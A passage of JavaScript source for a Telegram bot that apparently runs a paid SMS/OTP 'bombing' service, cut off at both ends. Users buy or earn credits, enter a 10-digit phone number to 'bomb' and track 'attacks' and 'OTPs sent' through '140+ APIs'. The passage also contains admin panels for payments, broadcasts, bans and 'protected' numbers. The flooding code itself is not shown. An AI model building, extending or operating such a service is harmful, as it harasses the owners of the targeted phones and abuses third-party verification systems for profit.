        bot.sendMessage(chatId, '✅ <b>QR Code saved successfully to database!</b>\n\nUsers will now see this QR code when buying credits.', { parse_mode: 'HTML' });
        
        userStates.delete(chatId);
        
    } catch (error) {
        bot.sendMessage(chatId, `❌ Error: ${error.message}`);
    }
}

// ============================================================
// ===== DATA BACKUP =====
// ============================================================

async function handleDataBackup(chatId) {
    if (!ADMIN_IDS.includes(Number(chatId))) {
        return bot.sendMessage(chatId, '❌ Admin only!');
    }

    try {
        const users = await User.find({}).lean();
        const protectedData = await Protected.findOne({}).lean();
        const redeemCodes = await Redeem.find({}).lean();
        const channels = await Channel.findOne({}).lean();
        const qrCode = await QrCode.findOne({}).lean();

        const backup = {
            timestamp: new Date().toISOString(),
            users: users || [],
            protected: protectedData || { numbers: [], owners: {}, protected_at: {} },
            redeemCodes: redeemCodes || [],
            channels: channels || { channels: [], private_channels: [], private_links: [] },
            qrCode: qrCode ? { exists: true, size: qrCode.data.length } : null
        };

        const json = JSON.stringify(backup, null, 2);
        const filePath = path.join(__dirname, 'backup.json');
        fs.writeFileSync(filePath, json);

        const protectedCount = backup.protected.numbers ? backup.protected.numbers.length : 0;
        const channelCount = (backup.channels.channels ? backup.channels.channels.length : 0) +
                            (backup.channels.private_channels ? backup.channels.private_channels.length : 0) +
                            (backup.channels.private_links ? backup.channels.private_links.length : 0);

        await bot.sendDocument(chatId, filePath, {
            caption: `📦 <b>Data Backup</b>\n\n📊 Users: ${backup.users.length}\n🛡️ Protected: ${protectedCount}\n🎟️ Redeem Codes: ${backup.redeemCodes.length}\n📺 Channels: ${channelCount}\n\n📅 ${new Date().toLocaleString()}`,
            parse_mode: 'HTML'
        });

        fs.unlinkSync(filePath);
    } catch (error) {
        bot.sendMessage(chatId, `❌ Backup failed: ${error.message}`);
    }
}

// ============================================================
// ===== BROADCAST SYSTEM =====
// ============================================================

async function handleBroadcast(chatId, msg) {
    try {
        const users = await User.find().select('_id');
        const totalUsers = users.length;
        
        if (totalUsers === 0) {
            return bot.sendMessage(chatId, '❌ No users found in database!');
        }
        
        const processingMsg = await bot.sendMessage(
            chatId,
            `📢 <b>Broadcasting to ${totalUsers} users...</b>\n\n⏳ Please wait...`,
            { parse_mode: 'HTML' }
        );
        
        let messageType = 'text';
        let mediaId = null;
        let caption = msg.caption || '';
        let text = msg.text || '';
        
        if (msg.photo) {
            messageType = 'photo';
            mediaId = msg.photo[msg.photo.length - 1].file_id;
            caption = msg.caption || '';
        } else if (msg.video) {
            messageType = 'video';
            mediaId = msg.video.file_id;
            caption = msg.caption || '';
        } else if (msg.document) {
            messageType = 'document';
            mediaId = msg.document.file_id;
            caption = msg.caption || '';
        } else if (msg.audio) {
            messageType = 'audio';
            mediaId = msg.audio.file_id;
            caption = msg.caption || '';
        } else if (msg.voice) {
            messageType = 'voice';
            mediaId = msg.voice.file_id;
            caption = msg.caption || '';
        } else if (msg.sticker) {
            messageType = 'sticker';
            mediaId = msg.sticker.file_id;
        } else if (msg.animation) {
            messageType = 'animation';
            mediaId = msg.animation.file_id;
            caption = msg.caption || '';
        } else if (msg.video_note) {
            messageType = 'video_note';
            mediaId = msg.video_note.file_id;
        } else if (msg.poll) {
            messageType = 'poll';
        } else if (msg.location) {
            messageType = 'location';
        } else if (msg.contact) {
            messageType = 'contact';
        } else if (msg.text) {
            messageType = 'text';
            text = msg.text;
        }
        
        let success = 0, fail = 0, blocked = 0, invalid = 0;
        const startTime = Date.now();
        const BATCH_SIZE_BROADCAST = 5;
        
        for (let i = 0; i < users.length; i++) {
            const user = users[i];
            const targetId = user._id;
            
            try {
                switch (messageType) {
                    case 'text':
                        await bot.sendMessage(targetId, text, { 
                            parse_mode: 'HTML', 
                            disable_web_page_preview: true, 
                            timeout: 10000 
                        });
                        break;
                    case 'photo':
                        await bot.sendPhoto(targetId, mediaId, { 
                            caption: caption || undefined,
                            parse_mode: 'HTML', 
                            timeout: 10000 
                        });
                        break;
                    case 'video':
                        await bot.sendVideo(targetId, mediaId, { 
                            caption: caption || undefined,
                            parse_mode: 'HTML', 
                            timeout: 10000 
                        });
                        break;
                    case 'document':
                        await bot.sendDocument(targetId, mediaId, { 
                            caption: caption || undefined,
                            parse_mode: 'HTML', 
                            timeout: 10000 
                        });
                        break;
                    case 'audio':
                        await bot.sendAudio(targetId, mediaId, { 
                            caption: caption || undefined,
                            parse_mode: 'HTML', 
                            timeout: 10000 
                        });
                        break;
                    case 'voice':
                        await bot.sendVoice(targetId, mediaId, { 
                            caption: caption || undefined,
                            parse_mode: 'HTML', 
                            timeout: 10000 
                        });
                        break;
                    case 'sticker':
                        await bot.sendSticker(targetId, mediaId, { timeout: 10000 });
                        break;
                    case 'animation':
                        await bot.sendAnimation(targetId, mediaId, { 
                            caption: caption || undefined,
                            parse_mode: 'HTML', 
                            timeout: 10000 
                        });
                        break;
                    case 'video_note':
                        await bot.sendVideoNote(targetId, mediaId, { timeout: 10000 });
                        break;
                    case 'poll':
                        await bot.sendPoll(targetId, msg.poll.question, msg.poll.options.map(o => o.text), {
                            is_anonymous: msg.poll.is_anonymous,
                            type: msg.poll.type,
                            allows_multiple_answers: msg.poll.allows_multiple_answers,
                            timeout: 10000
                        });
                        break;
                    case 'location':
                        await bot.sendLocation(targetId, msg.location.latitude, msg.location.longitude, { timeout: 10000 });
                        break;
                    case 'contact':
                        await bot.sendContact(targetId, msg.contact.phone_number, msg.contact.first_name, {
                            last_name: msg.contact.last_name || '',
                            vcard: msg.contact.vcard || '',
                            timeout: 10000
                        });
                        break;
                    default:
                        await bot.sendMessage(targetId, `📢 Please check the channel for updates.`, { parse_mode: 'HTML' });
                }
                success++;
            } catch (error) {
                const errorMsg = error.message || '';
                if (errorMsg.includes('bot was blocked') || errorMsg.includes('blocked')) {
                    blocked++;
                } else if (errorMsg.includes('chat not found') || errorMsg.includes('user not found')) {
                    invalid++;
                } else {
                    fail++;
                }
            }
            
            if ((i + 1) % BATCH_SIZE_BROADCAST === 0 || i === users.length - 1) {
                const processed = i + 1;
                const progress = Math.round((processed / totalUsers) * 100);
                const elapsed = Math.floor((Date.now() - startTime) / 1000);
                
                try {
                    await bot.editMessageText(
                        `📢 <b>BROADCASTING...</b>\n\n` +
                        `📊 Total Users: ${totalUsers}\n` +
                        `✅ Success: ${success}\n` +
                        `❌ Failed: ${fail}\n` +
                        `🚫 Blocked: ${blocked}\n` +
                        `❓ Invalid: ${invalid}\n` +
                        `⏳ Progress: ${progress}%\n` +
                        `⏱️ Elapsed: ${elapsed}s\n` +
                        `📎 Type: ${messageType.toUpperCase()}`,
                        { chat_id: chatId, message_id: processingMsg.message_id, parse_mode: 'HTML' }
                    );
                } catch (e) {}
            }
            
            await new Promise(r => setTimeout(r, 50));
        }
        
        const totalTime = Math.floor((Date.now() - startTime) / 1000);
        
        await bot.editMessageText(
            `✅ <b>BROADCAST COMPLETED!</b>\n\n` +
            `📊 Total Users: ${totalUsers}\n` +
            `✅ Success: ${success}\n` +
            `❌ Failed: ${fail}\n` +
            `🚫 Blocked: ${blocked}\n` +
            `❓ Invalid IDs: ${invalid}\n` +
            `⏱️ Time Taken: ${totalTime}s\n` +
            `📎 Message Type: ${messageType.toUpperCase()}`,
            { chat_id: chatId, message_id: processingMsg.message_id, parse_mode: 'HTML' }
        );
        
    } catch (error) {
        console.error('Broadcast error:', error);
        bot.sendMessage(chatId, `❌ Broadcast failed: ${error.message}`);
    } finally {
        adminBroadcastState.delete(chatId);
    }
}

// ============================================================
// ===== DIRECT MESSAGE USER =====
// ============================================================

async function handleDirectMessage(chatId) {
    if (!ADMIN_IDS.includes(Number(chatId))) {
        return bot.sendMessage(chatId, '❌ Admin only!');
    }
    adminDirectMessageState.set(chatId, { step: 'ask_id' });
    bot.sendMessage(chatId, '💬 <b>Send User ID</b>\n\nEnter the Telegram User ID of the user you want to message.', { parse_mode: 'HTML' });
}

async function processDirectMessageStep(chatId, text) {
    const state = adminDirectMessageState.get(chatId);
    if (!state) return;

    if (state.step === 'ask_id') {
        const userId = parseInt(text);
        if (isNaN(userId)) {
            return bot.sendMessage(chatId, '❌ Invalid User ID. Please enter a numeric ID.');
        }
        const user = await User.findById(userId);
        if (!user) {
            return bot.sendMessage(chatId, '❌ User not found in database.');
        }
        state.userId = userId;
        state.step = 'ask_message';
        adminDirectMessageState.set(chatId, state);
        bot.sendMessage(chatId, `👤 <b>User Found:</b> ${user.first_name || 'Unknown'} (@${user.username || 'No username'})\n\n📝 Now send the message you want to send to this user.\nYou can send text, photo, video, etc.`, { parse_mode: 'HTML' });
    }
}

// ============================================================
// ===== COMMAND HANDLERS =====
// ============================================================

bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;
    const args = msg.text.split(' ');
    const refCode = args.length > 1 ? args[1] : null;

    if (await isBanned(chatId)) {
        bot.sendMessage(chatId, '🚫 You are banned!');
        return;
    }

    const user = await getUser(chatId);
    user.username = msg.from.username || '';
    user.first_name = msg.from.first_name || '';
    await user.save();

    if (refCode) {
        user.pending_ref_code = refCode;
        await user.save();
    }

    const result = await checkChannelJoin(chatId, bot);
    if (!result.joined) {
        const keyboard = await getChannelJoinButtons(chatId);
        let msgText = `🚫 <b>Please join our channel(s) first!</b>\n\n`;
        
        if (result.unjoined.length > 0) {
            msgText += `🔴 <b>Missing Channels:</b>\n`;
            for (const ch of result.unjoined) {
                msgText += `• ${ch}\n`;
            }
            msgText += `\n`;
        }
        
        if (result.privateLinks.length > 0) {
            msgText += `🔒 <b>Private Channel Links:</b>\n`;
            for (const link of result.privateLinks) {
                msgText += `• ${link}\n`;
            }
            msgText += `\n`;
        }
        
        msgText += `After joining all channels, click the button below.`;
        
        bot.sendMessage(chatId, msgText, { 
            parse_mode: 'HTML',
            reply_markup: keyboard 
        });
        return;
    }

    if (user.pending_ref_code) {
        const result = await processReferral(chatId, user.pending_ref_code);
        bot.sendMessage(chatId, result.success ? `🎉 ${result.msg}` : `❌ ${result.msg}`);
        user.pending_ref_code = null;
        await user.save();
    }

    await showMainMenu(chatId);
});

async function showMainMenu(chatId) {
    const user = await getUser(chatId);
    
    const code = await generateReferralCode(chatId);
    const botInfo = await bot.getMe();
    
    const isPremium = user.daily_unlimited > Date.now() / 1000 || user.lifetime_unlimited === true;
    const userMode = isPremium ? '⭐ Premium User' : '👤 Normal User';
    const usernameDisplay = user.username ? `@${user.username}` : user.first_name || 'User';
    const creditsDisplay = user.credits;
    const referralsDisplay = user.total_referrals || 0;
    
    const welcomeText = 
`─【✨ WELCOME ✨】─
────────────────────
 ᴜsᴇʀ ➤ ${usernameDisplay}
 ɴᴀᴍᴇ ➤ ${user.first_name || 'No Name'}
 ᴍᴏᴅᴇ ➤ ${userMode}
────────────────────
 𝙃𝙖𝙫𝙚 𝘼 𝙎𝙚𝙭𝙮 𝘿𝙖𝙮 ☻

⭐ Credits: ${creditsDisplay}
👥 Referrals: ${referralsDisplay}

────────────────────
 ─【 𝐘𝐎𝐔-𝐀𝐑𝐄-𝐁𝐄𝐒𝐓 】─`;

    const inviteLink = `https://t.me/${botInfo.username}?start=${code}`;
    const fullMessage = welcomeText + `\n\n🔗 Your Referral Code: <code>${code}</code>\n📤 Share: ${inviteLink}`;
    
    const mainKb = mainKeyboard();
    bot.sendMessage(chatId, fullMessage, { 
        parse_mode: 'HTML', 
        reply_markup: mainKb.reply_markup 
    });
}

// ============================================================
// ===== MESSAGE HANDLER =====
// ============================================================

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    
    if (await isBanned(chatId)) return bot.sendMessage(chatId, '🚫 You are banned!');

    const user = await getUser(chatId);

    // ===== DIRECT MESSAGE HANDLER =====
    if (adminDirectMessageState.has(chatId) && ADMIN_IDS.includes(Number(chatId))) {
        const state = adminDirectMessageState.get(chatId);
        if (state) {
            if (state.step === 'ask_id' && text) {
                await processDirectMessageStep(chatId, text);
                return;
            } else if (state.step === 'ask_message') {
                try {
                    const targetUserId = state.userId;
                    await bot.forwardMessage(targetUserId, chatId, msg.message_id);
                    bot.sendMessage(chatId, `✅ Message forwarded to user <code>${targetUserId}</code>`, { parse_mode: 'HTML' });
                    adminDirectMessageState.delete(chatId);
                } catch (error) {
                    bot.sendMessage(chatId, `❌ Failed to forward message: ${error.message}`);
                }
                return;
            }
        }
    }

    // ===== SMART BROADCAST =====
    if (adminBroadcastState.has(chatId) && ADMIN_IDS.includes(Number(chatId))) {
        const state = adminBroadcastState.get(chatId);
        if (state && state.active) {
            if (text === '/cancel' || text === 'Cancel' || text === '❌ Cancel') {
                adminBroadcastState.delete(chatId);
                return bot.sendMessage(chatId, '❌ Broadcast cancelled.');
            }
            await handleBroadcast(chatId, msg);
            return;
        }
    }

    // ===== PAYMENT SCREENSHOT =====
    const state = userStates.get(chatId);
    if (state && state.state === 'payment_screenshot' && msg.photo) {
        await handlePaymentScreenshot(chatId, msg);
        return;
    }

    // ===== ADMIN: SET QR CODE =====
    if (text === '📸 SET QR CODE') {
        if (!ADMIN_IDS.includes(Number(chatId))) {
            return bot.sendMessage(chatId, '❌ Admin only!');
        }
        bot.sendMessage(chatId, '📸 <b>Send QR Code Photo</b>\n\nSend a photo to set as payment QR code.', { parse_mode: 'HTML' });
        userStates.set(chatId, { state: 'set_qr' });
        return;
    }

    if (state && state.state === 'set_qr' && msg.photo) {
        await handleSetQRCode(chatId, msg);
        return;
    }

    // ===== ADMIN: PAYMENT APPROVAL =====
    if (text === '💳 PAYMENT APPROVAL') {
        if (!ADMIN_IDS.includes(Number(chatId))) {
            return bot.sendMessage(chatId, '❌ Admin only!');
        }

        const pending = Array.from(pendingScreenshots.values()).filter(p => p.status === 'pending');
        
        if (pending.length === 0) {
            return bot.sendMessage(chatId, '📭 No pending payments.');
        }

        let msgText = `💳 <b>Pending Payments</b> (${pending.length})\n\n`;
        for (const p of pending) {
            msgText += `👤 ${p.first_name} (@${p.username})\n`;
            msgText += `💳 ${p.plan} - ₹${p.price}\n`;
            msgText += `🆔 <code>${p.payId}</code>\n\n`;
        }
        bot.sendMessage(chatId, msgText, { parse_mode: 'HTML' });
        return;
    }

    // ===== BUY CREDITS =====
    if (text === '💳 BUY CREDITS') {
        const keyboard = getPaymentButtons();
        bot.sendMessage(chatId, '💳 <b>Choose a plan:</b>', { 
            parse_mode: 'HTML', 
            reply_markup: keyboard.reply_markup 
        });
        return;
    }

    // ===== CHANNEL MANAGER STATE HANDLERS =====
    if (state && state.state === 'add_channel_public' && text) {
        if (!ADMIN_IDS.includes(Number(chatId))) {
            userStates.delete(chatId);
            return bot.sendMessage(chatId, '❌ Admin only!');
        }
        const channel = text.trim();
        if (!channel.startsWith('@')) {
            return bot.sendMessage(chatId, '❌ Channel name must start with @');
        }
        await addChannel(channel, false);
        bot.sendMessage(chatId, `✅ Public channel ${channel} added successfully!`);
        userStates.delete(chatId);
        return;
    }

    if (state && state.state === 'add_channel_private' && text) {
        if (!ADMIN_IDS.includes(Number(chatId))) {
            userStates.delete(chatId);
            return bot.sendMessage(chatId, '❌ Admin only!');
        }
        const channel = text.trim();
        if (!channel.startsWith('@')) {
            return bot.sendMessage(chatId, '❌ Channel name must start with @');
        }
        await addChannel(channel, true);
        bot.sendMessage(chatId, `✅ Private channel ${channel} added successfully!`);
        userStates.delete(chatId);
        return;
    }

    if (state && state.state === 'add_channel_link' && text) {
        if (!ADMIN_IDS.includes(Number(chatId))) {
            userStates.delete(chatId);
            return bot.sendMessage(chatId, '❌ Admin only!');
        }
        const link = text.trim();
        if (!link.includes('t.me/+') && !link.includes('t.me/joinchat/') && !link.startsWith('+')) {
            return bot.sendMessage(chatId, '❌ Invalid invite link! Format: https://t.me/+XXXX or https://t.me/joinchat/XXXX');
        }
        await addPrivateLink(link);
        bot.sendMessage(chatId, `✅ Private link added successfully!\n🔗 ${link}`);
        userStates.delete(chatId);
        return;
    }

    if (state && state.state === 'remove_channel' && text) {
        if (!ADMIN_IDS.includes(Number(chatId))) {
            userStates.delete(chatId);
            return bot.sendMessage(chatId, '❌ Admin only!');
        }
        const input = text.trim();
        
        const privateLinks = await getPrivateLinks();
        if (privateLinks.includes(input)) {
            await removePrivateLink(input);
            bot.sendMessage(chatId, `✅ Private link removed successfully!`);
            userStates.delete(chatId);
            return;
        }
        
        const channels = await getChannels();
        const privateChannels = await getPrivateChannels();
        
        if (channels.includes(input)) {
            await removeChannel(input, false);
            bot.sendMessage(chatId, `✅ Public channel ${input} removed successfully!`);
        } else if (privateChannels.includes(input)) {
            await removeChannel(input, true);
            bot.sendMessage(chatId, `✅ Private channel ${input} removed successfully!`);
        } else {
            bot.sendMessage(chatId, `❌ Channel/Link not found!`);
        }
        userStates.delete(chatId);
        return;
    }

    // ===== ADMIN: PROTECT NUMBER =====
    if (text === '🛡️ PROTECT NUMBER') {
        if (!ADMIN_IDS.includes(Number(chatId))) {
            return bot.sendMessage(chatId, '❌ Admin only!');
        }
        userStates.set(chatId, { state: 'admin_protect_number' });
        bot.sendMessage(chatId, '🛡️ Send 10-digit number to protect:');
        return;
    }

    if (state && state.state === 'admin_protect_number' && text) {
        if (!ADMIN_IDS.includes(Number(chatId))) {
            userStates.delete(chatId);
            return bot.sendMessage(chatId, '❌ Admin only!');
        }
        const phone = text.replace(/\D/g, '');
        if (phone.length !== 10) {
            return bot.sendMessage(chatId, '❌ Invalid number! Must be 10 digits.');
        }
        const isProtected = await isNumberProtected(phone);
        if (isProtected) {
            return bot.sendMessage(chatId, `⚠️ Number ${phone} is already protected!`);
        }
        const added = await addProtected(phone, `Admin (${chatId})`);
        if (added) {
            bot.sendMessage(chatId, `✅ Number ${phone} is now PROTECTED!`);
        } else {
            bot.sendMessage(chatId, `❌ Failed to protect ${phone}.`);
        }
        userStates.delete(chatId);
        return;
    }

    // ===== ADMIN: REMOVE PROTECTED =====
    if (text === '➖ REMOVE PROTECTED') {
        if (!ADMIN_IDS.includes(Number(chatId))) {
            return bot.sendMessage(chatId, '❌ Admin only!');
        }
        userStates.set(chatId, { state: 'admin_remove_protected' });
        bot.sendMessage(chatId, '❌ Send 10-digit number to unprotect:');
        return;
    }

    if (state && state.state === 'admin_remove_protected' && text) {
        if (!ADMIN_IDS.includes(Number(chatId))) {
            userStates.delete(chatId);
            return bot.sendMessage(chatId, '❌ Admin only!');
        }
        const phone = text.replace(/\D/g, '');
        if (phone.length !== 10) {
            return bot.sendMessage(chatId, '❌ Invalid number! Must be 10 digits.');
        }
        const removed = await removeProtected(phone);
        if (removed) {
            bot.sendMessage(chatId, `✅ Number ${phone} removed from protected list.`);
        } else {
            bot.sendMessage(chatId, `⚠️ Number ${phone} was not in protected list.`);
        }
        userStates.delete(chatId);
        return;
    }

    // ===== ADMIN: PROTECTED LIST =====
    if (text === '📋 PROTECTED LIST') {
        if (!ADMIN_IDS.includes(Number(chatId))) {
            return bot.sendMessage(chatId, '❌ Admin only!');
        }
        const data = await getProtectedWithOwners();
        let msg = '🛡️ <b>Protected Numbers</b>\n\n';
        if (data.numbers.length === 0) {
            msg += 'No numbers protected yet.';
        } else {
            for (const num of data.numbers) {
                const ownerId = data.owners[num] || 'Unknown';
                const protectedAt = data.protected_at[num] || 'Unknown';
                msg += `📱 ${num}\n   👤 ${ownerId}\n   🕐 ${protectedAt}\n\n`;
            }
        }
        bot.sendMessage(chatId, msg, { parse_mode: 'HTML' });
        return;
    }

    // ===== MY CREDITS =====
    if (text === '💰 MY CREDITS') {
        const isUnlimited = user.daily_unlimited > Date.now() / 1000 || user.lifetime_unlimited === true;
        const unlimitedText = isUnlimited ? '\n⭐ <b>Unlimited Plan Active!</b>' : '';
        const lifetimeText = user.lifetime_unlimited ? '🔮 <b>Lifetime Unlimited Active!</b>' : '';
        bot.sendMessage(chatId, 
            `💰 <b>Your Credits:</b> <code>${user.credits}</code>${unlimitedText}\n${lifetimeText}\n⚔️ <b>Total Attacks:</b> ${user.total_attacks || 0}\n👥 <b>Total Referrals:</b> ${user.total_referrals || 0}\n\n💡 Each minute costs 1 credit (max 10)\n⭐ 1 Day Unlimited: 50 coins\n🔮 Lifetime Unlimited: 400 coins`,
            { parse_mode: 'HTML' }
        );
        return;
    }

    // ===== DAILY SPIN =====
    if (text === '🎁 DAILY SPIN') {
        const now = Date.now() / 1000;
        if (user.last_daily && user.last_daily > now - 86400) {
            const remaining = Math.ceil((user.last_daily + 86400 - now) / 60);
            return bot.sendMessage(chatId, `⏳ You already claimed today's spin! Try again in ${remaining} minutes.`);
        }
        const spins = ['🎲  ...', '⚙️  ...', '🎡  ...'];
        let spinMsg = await bot.sendMessage(chatId, '🎰  ...');
        for (const spin of spins) {
            await bot.editMessageText(spin, { chat_id: chatId, message_id: spinMsg.message_id });
            await new Promise(r => setTimeout(r, 300));
        }
        const reward = Math.floor(Math.random() * 5) + 1;
        await updateCredits(chatId, reward);
        user.last_daily = now;
        await user.save();
        const newBalance = (await getUser(chatId)).credits;
        await bot.editMessageText(`🎉 <b>You won ${reward} credits!</b>\n💰 New balance: ${newBalance}`, 
            { chat_id: chatId, message_id: spinMsg.message_id, parse_mode: 'HTML' });
        return;
    }

    // ===== REDEEM CODE =====
    if (text === '🎟️ REDEEM CODE') {
        userStates.set(chatId, { state: 'redeem_code' });
        bot.sendMessage(chatId, '🎟️ Send the redeem code:');
        return;
    }

    // ===== REFERRAL =====
    if (text === '🔗 REFERRAL') {
        const result = await checkChannelJoin(chatId, bot);
        if (!result.joined) {
            const keyboard = await getChannelJoinButtons(chatId);
            let msgText = `🚫 <b>Please join our channel(s) first!</b>\n\n`;
            for (const ch of result.unjoined) {
                msgText += `• ${ch}\n`;
            }
            msgText += `\nAfter joining all channels, click the button below.`;
            return bot.sendMessage(chatId, msgText, { 
                parse_mode: 'HTML',
                reply_markup: keyboard 
            });
        }
        const code = await generateReferralCode(chatId);
        const botInfo = await bot.getMe();
        const refData = await getReferralData(chatId);
        const count = refData.count || 0;
        const msgText = `🔗 <b>Your Referral Code</b>\n\n🎯 <code>${code}</code>\n\n📊 You have referred: ${count} users\n💰 You earned: ${count * 5} credits\n\n<b>How it works:</b>\n• Share your code with friends\n• When they join, only you get 5 credits!\n• <b>Note:</b> Only 1 referral per minute\n• Invite link: <code>https://t.me/${botInfo.username}?start=${code}</code>`;
        bot.sendMessage(chatId, msgText, { parse_mode: 'HTML' });
        return;
    }

    // ===== MY STATS =====
    if (text === '📊 MY STATS') {
        const sessions = user.bomb_sessions || [];
        const totalSessions = sessions.length;
        const totalSent = sessions.reduce((sum, s) => sum + (s.total_sent || 0), 0);
        const isUnlimited = user.daily_unlimited > Date.now() / 1000 || user.lifetime_unlimited === true;
        bot.sendMessage(chatId, 
            `📊 <b>Your Stats</b>\n👤 ID: ${chatId}\n💰 Credits: ${user.credits}\n⚔️ Attacks: ${user.total_attacks || 0}\n📈 Sessions: ${totalSessions}\n📬 OTPs Sent: ${totalSent}\n⭐ Unlimited: ${isUnlimited ? '✅ Active' : '❌ Inactive'}\n👥 Referrals: ${user.total_referrals || 0}`,
            { parse_mode: 'HTML' }
        );
        return;
    }

    // ===== HELP =====
    if (text === '❓ HELP') {
        bot.sendMessage(chatId, 
            `🤖 <b>BOT COMMANDS & HELP</b>\n\n📱 <b>START BOMB</b> - Start bombing\n⏹️ <b>STOP BOMB</b> - Stop active bombing\n💰 <b>MY CREDITS</b> - Check your credits\n🎁 <b>DAILY SPIN</b> - Daily spin (1-5 credits)\n🎟️ <b>REDEEM CODE</b> - Redeem code\n🔗 <b>REFERRAL</b> - Get referral link\n💳 <b>BUY CREDITS</b> - Buy credits\n📊 <b>MY STATS</b> - View your stats\n\n💡 <b>Bombing Costs:</b>\n• 1-10 minutes: 1 credit per minute\n• 11-60 minutes: 10 credits\n• ⭐ 1 Day Unlimited: 50 coins\n• 🔮 Lifetime Unlimited: 400 coins\n\n⭐ <b>Referral Bonus:</b> Only referrer gets 5 credits!`,
            { parse_mode: 'HTML' }
        );
        return;
    }

    // ===== ADMIN PANEL =====
    if (text === '👑 ADMIN PANEL') {
        if (!ADMIN_IDS.includes(Number(chatId))) return bot.sendMessage(chatId, '❌ You are not an admin.');
        const adminKb = adminKeyboard();
        bot.sendMessage(chatId, '🔐 Admin Panel', { 
            reply_markup: adminKb.reply_markup 
        });
        return;
    }

    if (text === '🔙 BACK') {
        const mainKb = mainKeyboard();
        bot.sendMessage(chatId, '🔙 Back to main menu', { 
            reply_markup: mainKb.reply_markup 
        });
        return;
    }

    // ===== ADMIN COMMANDS =====
    if (ADMIN_IDS.includes(Number(chatId))) {
        if (text === '📊 STATS') {
            const totalUsers = await User.countDocuments();
            const totalAttacks = (await User.aggregate([{ $group: { _id: null, total: { $sum: '$total_attacks' } } }]))[0]?.total || 0;
            const totalCredits = (await User.aggregate([{ $group: { _id: null, total: { $sum: '$credits' } } }]))[0]?.total || 0;
            const channels = await getChannels();
            const privateChannels = await getPrivateChannels();
            const privateLinks = await getPrivateLinks();
            const protectedData = await getProtectedWithOwners();
            const protectedCount = protectedData.numbers ? protectedData.numbers.length : 0;
            bot.sendMessage(chatId, 
                `📊 <b>BOT STATS</b>\n👥 Users: ${totalUsers}\n💰 Total credits: ${totalCredits}\n⚔️ Attacks: ${totalAttacks}\n📡 APIs loaded: 140+\n📺 Channels: ${channels.length + privateChannels.length + privateLinks.length}\n🛡️ Protected: ${protectedCount}\n🌐 API Instances: 6 (API6: External)`,
                { parse_mode: 'HTML' }
            );
            return;
        }

        if (text === '👥 USERS LIST') {
            const users = await User.find().select('_id username credits total_attacks total_referrals').limit(20);
            let list = '👥 Users (first 20):\n\n';
            users.forEach(u => {
                list += `🆔 ${u._id} | @${u.username || 'no_username'} | 💰${u.credits} | 💥${u.total_attacks} | 👥${u.total_referrals || 0}\n`;
            });
            bot.sendMessage(chatId, list);
            return;
        }

        if (text === '🎟️ GEN CODE') {
            userStates.set(chatId, { state: 'gen_code' });
            bot.sendMessage(chatId, '💰 Send amount for the redeem code (max 1000):');
            return;
        }

        if (text === '🚫 BAN USER') {
            userStates.set(chatId, { state: 'ban_user' });
            bot.sendMessage(chatId, '🚫 Send user ID to ban:');
            return;
        }

        if (text === '✅ UNBAN USER') {
            userStates.set(chatId, { state: 'unban_user' });
            bot.sendMessage(chatId, '✅ Send user ID to unban:');
            return;
        }

        if (text === '💰 ADD CREDITS') {
            userStates.set(chatId, { state: 'add_credits' });
            bot.sendMessage(chatId, '💰 Send user ID:');
            return;
        }

        if (text === '📢 BROADCAST') {
            adminBroadcastState.set(chatId, { active: true });
            bot.sendMessage(chatId, 
                `📢 <b>Broadcast Mode Activated</b>\n\n` +
                `Send any message (text, photo, video, etc.) and I'll send it to ALL users.\n\n` +
                `Send /cancel to exit.`,
                { parse_mode: 'HTML' }
            );
            return;
        }

        if (text === '📋 ALL USERS') {
            const users = await User.find().select('_id username credits total_referrals');
            let page = 0;
            const perPage = 15;
            const totalPages = Math.ceil(users.length / perPage);
            const sendPage = async (pageNum) => {
                const start = pageNum * perPage;
                const end = start + perPage;
                const chunk = users.slice(start, end);
                let msg = '👥 <b>ALL USERS</b>\n\n';
                chunk.forEach(u => {
                    msg += `🆔 <code>${u._id}</code> | @${u.username || 'no_username'} | 💰${u.credits} | 👥${u.total_referrals || 0}\n`;
                });
                msg += `\nPage ${pageNum+1}/${totalPages}`;
                const markup = totalPages > 1 ? {
                    reply_markup: {
                        inline_keyboard: [
                            ...(pageNum > 0 ? [{ text: '◀️ Prev', callback_data: `allusers_${pageNum-1}` }] : []),
                            ...(pageNum < totalPages-1 ? [{ text: 'Next ▶️', callback_data: `allusers_${pageNum+1}` }] : [])
                        ]
                    }
                } : undefined;
                return bot.sendMessage(chatId, msg, { parse_mode: 'HTML', ...markup });
            };
            await sendPage(0);
            userStates.set(chatId, { state: 'allusers', users, page: 0, perPage, totalPages });
            return;
        }

        if (text === '🔄 UNLIMITED PLAN') {
            userStates.set(chatId, { state: 'unlimited_plan' });
            bot.sendMessage(chatId, '⭐ Send user ID to grant 1-day unlimited bombing plan:');
            return;
        }

        if (text === '📺 CHANNEL MANAGER') {
            const keyboard = getChannelManagerButtons();
            bot.sendMessage(chatId, '📺 <b>Channel Manager</b>\n\nManage channels and private links.', { 
                parse_mode: 'HTML',
                reply_markup: keyboard.reply_markup 
            });
            return;
        }

        if (text === '💬 MESSAGE USER') {
            await handleDirectMessage(chatId);
            return;
        }

        if (text === '📦 DATA BACKUP') {
            await handleDataBackup(chatId);
            return;
        }
    }

    // ===== START BOMB =====
    if (text && text.includes('START BOMB')) {
        if (bombingStatus.get(chatId)) {
            return bot.sendMessage(chatId, '❌ You already have an active bombing session. Use /stop first.');
        }
        const result = await checkChannelJoin(chatId, bot);
        if (!result.joined) {
            const keyboard = await getChannelJoinButtons(chatId);
            let msgText = `🚫 <b>Please join our channel(s) first!</b>\n\n`;
            for (const ch of result.unjoined) {
                msgText += `• ${ch}\n`;
            }
            msgText += `\nAfter joining all channels, click the button below.`;
            return bot.sendMessage(chatId, msgText, { 
                parse_mode: 'HTML',
                reply_markup: keyboard 
            });
        }
        bot.sendMessage(chatId, '📱 Send the 10-digit phone number to bomb:');
        userStates.set(chatId, { state: 'enter_phone' });
        return;
    }

    // ===== STOP BOMB =====
    if (text === '🔴 STOP BOMB' || text === '/stop') {
        if (bombingStatus.get(chatId)) {
            bombingStatus.set(chatId, false);
            bot.sendMessage(chatId, '⏹️ Bombing stopped.');
        } else {
            bot.sendMessage(chatId, '❌ No active bombing.');
        }
        return;
    }

    // ===== STATE HANDLERS =====
    if (userStates.has(chatId)) {
        const state = userStates.get(chatId);
        const input = text.trim();

        if (state.state === 'redeem_code') {
            const amount = await getRedeemCode(input.toUpperCase());
            if (amount === null) {
                bot.sendMessage(chatId, '❌ Invalid code!');
            } else {
                await updateCredits(chatId, amount);
